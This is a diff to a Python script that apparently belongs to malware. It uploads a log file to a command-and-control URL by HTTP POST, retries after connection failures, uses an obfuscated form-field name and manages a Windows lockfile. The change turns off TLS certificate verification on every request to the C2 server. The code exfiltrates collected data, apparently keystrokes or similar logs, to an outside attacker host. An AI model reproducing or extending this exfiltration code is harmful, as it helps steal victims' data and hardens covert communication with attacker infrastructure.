@@ -27,7 +27,8 @@ if __name__ == "__main__":
 	##check if enpoint is live after last connection failed
 	if(blocked == True):
 		checked = requests.request('HEAD',
-					   c2_url,)
+					   c2_url,
+					  verify=False)
 		if(checked.status_code == 200):
 			blocked = False
 	if(logpath.is_file() == False):
@@ -40,7 +41,8 @@ if __name__ == "__main__":
 	requests_obj = requests.request('POST',
 					c2_url,
 					headers=header_assembly,
-					files={'bbe02f946d5455d74616fc9777557c22': open(logfile, 'r')})
+					files={'bbe02f946d5455d74616fc9777557c22': open(logfile, 'r')},
+				       	verify=False)
 
 	if(requests_obj.status_code == 200):
 		sys.exit()
@@ -53,7 +55,8 @@ if __name__ == "__main__":
 			requests_obj = requests.request('POST',
 							c2_url,
 							headers=header_assembly,
-							files={'bbe02f946d5455d74616fc9777557c22':open(logfile, 'r')})
+							files={'bbe02f946d5455d74616fc9777557c22':open(logfile, 'r')},
+						        verify=False)
 		except requests.exceptions.ConnectTimeout:
 			if(os.name == 'nt'):
 				Path(WINDOWS_LOCKFILE).touch
